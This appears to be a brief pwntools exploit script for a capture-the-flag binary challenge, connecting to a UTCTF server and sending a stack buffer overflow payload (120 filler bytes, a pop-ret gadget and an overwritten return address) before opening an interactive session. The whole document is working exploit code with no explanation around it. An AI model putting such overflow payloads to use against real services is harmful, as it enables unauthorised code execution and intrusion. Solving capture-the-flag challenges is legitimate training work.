from pwn import *
# r=process("./pwnable")

# gdb.attach(r,"""
# 	b *0x00000000004005ea
# 	b *0x00000000004005d9
# 	c
# 	""")
r=remote("binary.utctf.live",9002)
r.recvuntil("one!")
pop_ret=0x0000000000400693
payload="a"*120+p64(pop_ret)+p64(0xdeadbeef)+p64(0x00000000004005ea)
r.sendline(payload)
r.interactive()
